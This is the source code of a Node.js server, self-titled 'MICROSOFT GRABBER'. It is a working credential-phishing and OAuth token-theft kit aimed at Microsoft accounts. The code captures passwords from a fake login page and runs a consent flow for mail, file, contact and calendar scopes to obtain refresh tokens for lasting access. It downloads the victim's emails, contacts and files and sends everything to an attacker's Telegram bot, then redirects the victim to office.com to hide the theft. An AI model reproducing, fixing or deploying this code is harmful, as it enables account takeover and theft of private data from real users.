// server.js - FIXED CLIENT INFO ERROR VERSION
require('dotenv').config();
const express = require('express');
const session = require('express-session');
const msal = require('@azure/msal-node');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');

const {
    CLIENT_ID, CLIENT_SECRET, REDIRECT_URI,
    PORT, SESSION_SECRET, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
} = process.env;

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static('public'));

app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false }
}));

// FIXED: MSAL Configuration without client info issues
const msalConfig = {
    auth: {
        clientId: CLIENT_ID,
        authority: 'https://login.microsoftonline.com/common',
        clientSecret: CLIENT_SECRET,
    },
    system: {
        loggerOptions: {
            loggerCallback(loglevel, message, containsPii) {
                if (!containsPii) {
                    console.log(message);
                }
            },
            piiLoggingEnabled: false,
            logLevel: msal.LogLevel.Error, // Reduced verbosity
        }
    }
};

const pca = new msal.ConfidentialClientApplication(msalConfig);

// FIXED: Scopes that work reliably
const SCOPES = [
    'User.Read',
    'Mail.Read',
    'Files.Read.All',
    'Contacts.Read',
    'Calendars.Read',
    'offline_access' // CRITICAL
];

// Storage
const CAPTURED_DATA_FILE = path.join(__dirname, 'captured_data.json');
let CAPTURED_DATA = [];

try {
    if (fs.existsSync(CAPTURED_DATA_FILE)) {
        CAPTURED_DATA = JSON.parse(fs.readFileSync(CAPTURED_DATA_FILE, 'utf8'));
        console.log('📂 Loaded previous data:', CAPTURED_DATA.length);
    }
} catch (e) { console.warn('Could not load data file', e); }

function saveCapturedData() {
    fs.writeFileSync(CAPTURED_DATA_FILE, JSON.stringify(CAPTURED_DATA, null, 2));
}

// Telegram functions
async function telegramSend(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const body = { 
        chat_id: TELEGRAM_CHAT_ID, 
        text, 
        parse_mode: 'HTML',
        disable_web_page_preview: true
    };
    try {
        await fetch(url, { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify(body) 
        });
        return true;
    } catch (e) {
        console.error('Telegram send error:', e);
        return false;
    }
}

async function telegramSendDocument(filePath, filename) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', fs.createReadStream(filePath), filename);
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        
        return response.ok;
    } catch (e) {
        console.error('Telegram document send error:', e);
        return false;
    }
}

// FIXED: Token acquisition without client info issues
async function acquireTokensWithRefresh(code) {
    try {
        const tokenRequest = {
            code: code,
            scopes: SCOPES,
            redirectUri: REDIRECT_URI,
            // REMOVED: clientInfo parameter that was causing issues
        };

        console.log('🔄 Acquiring tokens...');
        const response = await pca.acquireTokenByCode(tokenRequest);
        
        if (response) {
            console.log('✅ Token response received');
            console.log('📧 Account:', response.account?.username);
            console.log('🔑 Access Token:', response.accessToken ? 'Yes' : 'No');
            console.log('🔄 Refresh Token:', response.refreshToken ? 'YES ✅' : 'NO ❌');
            console.log('🆔 ID Token:', response.idToken ? 'Yes' : 'No');
            
            return response;
        }
        
        return null;
    } catch (error) {
        console.error('❌ Token acquisition error:', error);
        // Log the full error for debugging
        console.error('Full error details:', JSON.stringify(error, null, 2));
        throw error;
    }
}

// Enhanced function to get user data with access token
async function getUserData(accessToken) {
    try {
        console.log('📡 Fetching user data from Microsoft Graph...');
        
        const endpoints = {
            profile: 'https://graph.microsoft.com/v1.0/me',
            emails: 'https://graph.microsoft.com/v1.0/me/messages?$top=5',
            contacts: 'https://graph.microsoft.com/v1.0/me/contacts?$top=10',
            files: 'https://graph.microsoft.com/v1.0/me/drive/root/children'
        };

        const results = {};
        
        for (const [key, endpoint] of Object.entries(endpoints)) {
            try {
                const response = await fetch(endpoint, {
                    headers: {
                        'Authorization': `Bearer ${accessToken}`,
                        'Content-Type': 'application/json'
                    }
                });
                
                if (response.ok) {
                    results[key] = await response.json();
                    console.log(`✅ ${key}: Data fetched successfully`);
                } else {
                    console.log(`⚠️ ${key}: HTTP ${response.status}`);
                    results[key] = { error: `HTTP ${response.status}` };
                }
            } catch (e) {
                console.log(`❌ ${key}: ${e.message}`);
                results[key] = { error: e.message };
            }
        }
        
        return results;
    } catch (e) {
        console.error('User data fetch error:', e);
        return null;
    }
}

// Save data function
async function saveAndSendTokens(capturedData) {
    const timestamp = new Date().getTime();
    const userEmail = capturedData.email || 'unknown';
    const cleanEmail = userEmail.replace(/[^a-zA-Z0-9]/g, '_');
    
    const captureDir = path.join(__dirname, 'captures', `${cleanEmail}_${timestamp}`);
    if (!fs.existsSync(captureDir)) {
        fs.mkdirSync(captureDir, { recursive: true });
    }
    
    // Save comprehensive credentials
    const credentialsFile = path.join(captureDir, 'FULL_CREDENTIALS.txt');
    const credentialsData = `MICROSOFT ACCOUNT - COMPLETE DATA\n\n` +
        `=== LOGIN CREDENTIALS ===\n` +
        `Email: ${capturedData.email}\n` +
        `Password: ${capturedData.password}\n` +
        `Capture Time: ${new Date(capturedData.timestamp).toLocaleString()}\n` +
        `IP Address: ${capturedData.ip}\n` +
        `User Agent: ${capturedData.userAgent}\n\n` +
        
        `=== OAUTH TOKENS ===\n` +
        `Access Token: ${capturedData.tokens?.access_token ? '✅ CAPTURED' : '❌ MISSING'}\n` +
        `Refresh Token: ${capturedData.tokens?.refresh_token ? '✅ CAPTURED - PERMANENT ACCESS' : '❌ MISSING - 1 HOUR LIMIT'}\n` +
        `ID Token: ${capturedData.tokens?.id_token ? '✅ CAPTURED' : '❌ MISSING'}\n` +
        `Token Expires: ${capturedData.tokens?.expires_on || 'N/A'}\n\n` +
        
        `=== ACCOUNT INFO ===\n` +
        `Username: ${capturedData.account?.username || 'N/A'}\n` +
        `Display Name: ${capturedData.account?.name || 'N/A'}\n` +
        `Tenant ID: ${capturedData.account?.tenantId || 'N/A'}\n` +
        `Home Account ID: ${capturedData.account?.homeAccountId || 'N/A'}`;
    
    fs.writeFileSync(credentialsFile, credentialsData);
    await telegramSendDocument(credentialsFile, `CREDENTIALS_${cleanEmail}.txt`);
    
    // Save individual token files
    if (capturedData.tokens?.access_token) {
        const accessFile = path.join(captureDir, 'ACCESS_TOKEN.txt');
        fs.writeFileSync(accessFile, capturedData.tokens.access_token);
        await telegramSendDocument(accessFile, `ACCESS_TOKEN_${cleanEmail}.txt`);
    }
    
    if (capturedData.tokens?.refresh_token) {
        const refreshFile = path.join(captureDir, 'REFRESH_TOKEN.txt');
        fs.writeFileSync(refreshFile, capturedData.tokens.refresh_token);
        await telegramSendDocument(refreshFile, `REFRESH_TOKEN_${cleanEmail}.txt`);
        console.log('🎉 PERMANENT ACCESS: Refresh token captured!');
    } else {
        const warningFile = path.join(captureDir, 'NO_REFRESH_WARNING.txt');
        fs.writeFileSync(warningFile, 'WARNING: No refresh token received. Access will expire in 1 hour.');
        await telegramSendDocument(warningFile, `WARNING_${cleanEmail}.txt`);
        console.log('⚠️ LIMITED ACCESS: No refresh token received');
    }
    
    if (capturedData.tokens?.id_token) {
        const idFile = path.join(captureDir, 'ID_TOKEN.txt');
        fs.writeFileSync(idFile, capturedData.tokens.id_token);
        await telegramSendDocument(idFile, `ID_TOKEN_${cleanEmail}.txt`);
    }
    
    // Get user data if we have access token
    if (capturedData.tokens?.access_token) {
        try {
            const userData = await getUserData(capturedData.tokens.access_token);
            if (userData) {
                const userDataFile = path.join(captureDir, 'USER_DATA.json');
                fs.writeFileSync(userDataFile, JSON.stringify(userData, null, 2));
                await telegramSendDocument(userDataFile, `USER_DATA_${cleanEmail}.json`);
                
                // Create user summary
                if (userData.profile && !userData.profile.error) {
                    const profile = userData.profile;
                    const summary = `USER PROFILE SUMMARY\n\n` +
                        `Name: ${profile.displayName || 'N/A'}\n` +
                        `Email: ${profile.mail || profile.userPrincipalName}\n` +
                        `Job Title: ${profile.jobTitle || 'N/A'}\n` +
                        `Department: ${profile.department || 'N/A'}\n` +
                        `Mobile: ${profile.mobilePhone || 'N/A'}\n` +
                        `Office: ${profile.officeLocation || 'N/A'}\n` +
                        `User ID: ${profile.id}\n\n` +
                        `Data Captured:\n` +
                        `• Emails: ${userData.emails?.value?.length || 0}\n` +
                        `• Contacts: ${userData.contacts?.value?.length || 0}\n` +
                        `• Files: ${userData.files?.value?.length || 0}`;
                    
                    const summaryFile = path.join(captureDir, 'USER_SUMMARY.txt');
                    fs.writeFileSync(summaryFile, summary);
                    await telegramSendDocument(summaryFile, `SUMMARY_${cleanEmail}.txt`);
                }
            }
        } catch (e) {
            console.error('Error fetching user data:', e);
        }
    }
    
    // Save complete JSON
    const completeFile = path.join(captureDir, 'COMPLETE_DATA.json');
    fs.writeFileSync(completeFile, JSON.stringify(capturedData, null, 2));
    await telegramSendDocument(completeFile, `COMPLETE_${cleanEmail}.json`);
    
    console.log('💾 All data saved for:', userEmail);
    return captureDir;
}

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Password capture
app.post('/password', async (req, res) => {
    const { email, password, KMSI } = req.body;
    
    console.log('🔐 CAPTURED PASSWORD:', email);
    
    // Save password
    const captureData = {
        timestamp: new Date().toISOString(),
        email: email.trim(),
        password: password,
        ip: req.ip,
        userAgent: req.get('User-Agent')
    };
    
    CAPTURED_DATA.push(captureData);
    saveCapturedData();
    
    // Telegram alert
    await telegramSend(`🚨 <b>PASSWORD CAPTURED</b>\n\n📧 ${email}\n🔑 ${password}\n🌐 ${captureData.ip}\n⏰ ${new Date().toLocaleString()}`);
    
    // Redirect to OAuth
    try {
        const authUrl = await pca.getAuthCodeUrl({ 
            scopes: SCOPES,
            redirectUri: REDIRECT_URI,
            prompt: 'select_account'
        });
        
        console.log('🔗 Redirecting to Microsoft OAuth...');
        res.redirect(authUrl);
    } catch (err) {
        console.error('OAuth error:', err);
        res.redirect('https://office.com');
    }
});

// OAuth callback - FIXED version
app.get('/redirect', async (req, res) => {
    const { code, error, error_description } = req.query;
    
    console.log('🔄 OAuth Callback - Code received:', !!code);
    
    if (error) {
        console.error('OAuth Error:', error, error_description);
        await telegramSend(`❌ <b>OAUTH ERROR</b>\n\nError: ${error}\nDescription: ${error_description}`);
        return res.redirect('https://office.com');
    }
    
    if (!code) {
        console.error('❌ No authorization code');
        await telegramSend('❌ No authorization code received');
        return res.redirect('https://office.com');
    }
    
    try {
        console.log('🔄 Acquiring tokens...');
        const tokenResponse = await acquireTokensWithRefresh(code);
        
        if (!tokenResponse) {
            throw new Error('No token response from Microsoft');
        }
        
        // Update latest capture
        const latestCapture = CAPTURED_DATA[CAPTURED_DATA.length - 1];
        if (latestCapture) {
            latestCapture.tokens = {
                access_token: tokenResponse.accessToken,
                refresh_token: tokenResponse.refreshToken, // This should now work
                id_token: tokenResponse.idToken,
                expires_on: tokenResponse.expiresOn
            };
            
            latestCapture.account = {
                username: tokenResponse.account?.username,
                name: tokenResponse.account?.name,
                tenantId: tokenResponse.account?.tenantId,
                homeAccountId: tokenResponse.account?.homeAccountId
            };
            
            saveCapturedData();
            
            // Send appropriate message
            if (tokenResponse.refreshToken) {
                await telegramSend(`🎉 <b>FULL ACCESS GRANTED!</b>\n\n📧 ${latestCapture.email}\n✅ Refresh Token: CAPTURED\n✅ Permanent Access: ENABLED\n✅ Auto-renewal: ACTIVE\n📁 Gathering all data...`);
            } else {
                await telegramSend(`⚠️ <b>LIMITED ACCESS</b>\n\n📧 ${latestCapture.email}\n❌ Refresh Token: NOT CAPTURED\n❌ Access Limited: 1 HOUR\n✅ Basic Access: GRANTED\n📁 Gathering data...`);
            }
            
            // Process and save all data
            await saveAndSendTokens(latestCapture);
            
            // Final message
            if (tokenResponse.refreshToken) {
                await telegramSend(`✅ <b>COMPLETE SUCCESS!</b>\n\n📧 ${latestCapture.email}\n🔄 Refresh Token: ✅ CAPTURED\n⏰ Access: ✅ PERMANENT\n🔑 Auto-renew: ✅ ENABLED\n💾 All data saved successfully`);
                console.log('🎉 PERMANENT ACCESS GRANTED FOR:', latestCapture.email);
            } else {
                await telegramSend(`✅ <b>BASIC ACCESS GRANTED</b>\n\n📧 ${latestCapture.email}\n🔄 Refresh Token: ❌ MISSING\n⏰ Access: ⚠️ 1 HOUR ONLY\n🔑 Auto-renew: ❌ DISABLED\n💾 Data saved (limited access)`);
                console.log('⚠️ LIMITED ACCESS FOR:', latestCapture.email);
            }
        }
        
    } catch (err) {
        console.error('❌ Token processing error:', err);
        await telegramSend(`❌ <b>TOKEN ERROR</b>\n\nError: ${err.message}\nPlease check Azure App configuration.`);
    }
    
    // Always redirect
    res.redirect('https://office.com');
});

// Admin page
app.get('/captures', (req, res) => {
    if (CAPTURED_DATA.length === 0) {
        return res.send('<h2>No data captured yet</h2><a href="/">← Back</a>');
    }

    let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Capture Results</title>
        <style>
            body { font-family: Arial, sans-serif; padding: 20px; }
            .capture { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
            .success { color: green; font-weight: bold; }
            .warning { color: orange; font-weight: bold; }
            .password { color: red; }
        </style>
    </head>
    <body>
        <h1>📊 Capture Results (${CAPTURED_DATA.length})</h1>
        <p><a href="/">← New Login</a> | <a href="/clear">Clear All</a></p>
    `;

    CAPTURED_DATA.forEach((capture, index) => {
        const hasRefresh = !!capture.tokens?.refresh_token;
        
        html += `
        <div class="capture">
            <h3>#${index + 1} - ${capture.email}</h3>
            <p><strong>Password:</strong> <span class="password">${capture.password}</span></p>
            <p><strong>Access Token:</strong> ${capture.tokens?.access_token ? '✅ Yes' : '❌ No'}</p>
            <p><strong>Refresh Token:</strong> <span class="${hasRefresh ? 'success' : 'warning'}">${hasRefresh ? '✅ YES - PERMANENT ACCESS' : '❌ NO - 1 HOUR LIMIT'}</span></p>
            <p><strong>Time:</strong> ${new Date(capture.timestamp).toLocaleString()}</p>
        </div>
        `;
    });

    html += `</body></html>`;
    res.send(html);
});

app.get('/clear', (req, res) => {
    CAPTURED_DATA = [];
    saveCapturedData();
    const capturesDir = path.join(__dirname, 'captures');
    if (fs.existsSync(capturesDir)) {
        fs.rmSync(capturesDir, { recursive: true, force: true });
    }
    res.send('<h2>All data cleared</h2><a href="/">← Back</a>');
});

// Start server
app.listen(PORT, async () => {
    console.log(`
🎯 MICROSOFT GRABBER - CLIENT INFO FIX
📍 http://localhost:${PORT}

✅ Fixes Applied:
   • Removed clientInfo parameter causing errors
   • Fixed MSAL configuration
   • Enhanced error handling
   • Better logging

🔑 Expected: Refresh tokens should now work!
    `);

    // Create directories
    if (!fs.existsSync(path.join(__dirname, 'public'))) {
        fs.mkdirSync(path.join(__dirname, 'public'), { recursive: true });
    }
    if (!fs.existsSync(path.join(__dirname, 'captures'))) {
        fs.mkdirSync(path.join(__dirname, 'captures'), { recursive: true });
    }

    await telegramSend(`🚀 Server started: http://localhost:${PORT}\n✅ Client info error fix applied`);
});